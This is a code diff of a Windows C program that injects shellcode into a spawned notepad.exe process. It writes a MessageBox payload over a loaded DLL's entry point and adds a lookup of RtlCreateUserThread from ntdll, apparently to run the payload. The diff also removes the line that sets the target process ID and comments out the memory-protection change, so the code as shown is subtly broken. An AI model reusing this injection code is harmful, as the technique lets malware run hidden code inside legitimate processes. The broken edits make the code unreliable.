@@ -2,9 +2,17 @@
 #include <Windows.h>
 #include <Psapi.h>
 
+typedef struct MY_CLIENT_ID
+{
+	PVOID UniqueProcess;
+	PVOID UniqueThread;
+} MY_CLIENT_ID, * MY_PCLIENT_ID;
+
+typedef NTSTATUS(__stdcall* RLTCREATEUSERTHREAD)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, PULONG, PULONG, PVOID, PVOID, PHANDLE, MY_PCLIENT_ID);
+
 INT main()
 {
-	STARTUPINFOA			startupInfo;
+	STARTUPINFOA			startupInfo; 
 	PROCESS_INFORMATION		processInformation;
 	DWORD					dwPid;
 	DWORD					dwModulesSizeNeeded = 0;
@@ -28,19 +36,27 @@ INT main()
 	PIMAGE_DOS_HEADER		dosHeader;
 	PIMAGE_NT_HEADERS		ntHeader;
 
+
+	// Function pointers
+	RLTCREATEUSERTHREAD		pRtlCreateUserThread = NULL;
+
+	// Load functions from ntdll
+	const HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
+	pRtlCreateUserThread = (RLTCREATEUSERTHREAD)GetProcAddress(hNtdll, "RtlCreateUserThread");
+
 	ZeroMemory(&startupInfo, sizeof startupInfo);
 	startupInfo.cb = sizeof startupInfo;
 	ZeroMemory(&processInformation, sizeof processInformation);
 
 	// Opens process
-	if (!CreateProcessA(NULL, "\"calc.exe\"", NULL, NULL, FALSE,
+	if (!CreateProcessA(NULL, "\"notepad.exe\"", NULL, NULL, FALSE,
 		DETACHED_PROCESS, NULL, NULL, &startupInfo, &processInformation)) {
 		printf("[-] CreateProcess failed: (%lu).\n", GetLastError());
 		goto Cleanup;
 	}
 
 	// Get handle to process
-	dwPid = processInformation.dwProcessId;
+	
 	if ((hProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid)) == INVALID_HANDLE_VALUE) {
 		printf("[-] Could not get handle to target process: (%lu).\n", GetLastError());
 		goto Cleanup;
@@ -102,11 +118,11 @@ Continue:
 		ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)pTargetProcessHeaderBuffer + dosHeader->e_lfanew);
 		pDllEntryPoint = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)pRemoteBuffer);
 
-		// Set permission of DLL's AddressofEntryPoint
-		if (!VirtualProtectEx(hProcessHandle, pDllEntryPoint, sizeof bMessageboxShellcode64, PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
-			printf("[-] Unable to set  DLL's AddressofEntryPoint to PAGE_EXECUTE_READWRITE: (%lu).\n", GetLastError());
-			goto Cleanup;
-		}
+		//// Set permission of DLL's AddressofEntryPoint
+		//if (!VirtualProtectEx(hProcessHandle, pDllEntryPoint, sizeof bMessageboxShellcode64, PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
+		//	printf("[-] Unable to set  DLL's AddressofEntryPoint to PAGE_EXECUTE_READWRITE: (%lu).\n", GetLastError());
+		//	goto Cleanup;
+		//}
 		
 		// Write shellcode to DLL's AddressofEntryPoint
 		if (!WriteProcessMemory(hProcessHandle, pDllEntryPoint, (LPCVOID)bMessageboxShellcode64, sizeof bMessageboxShellcode64, NULL)) {
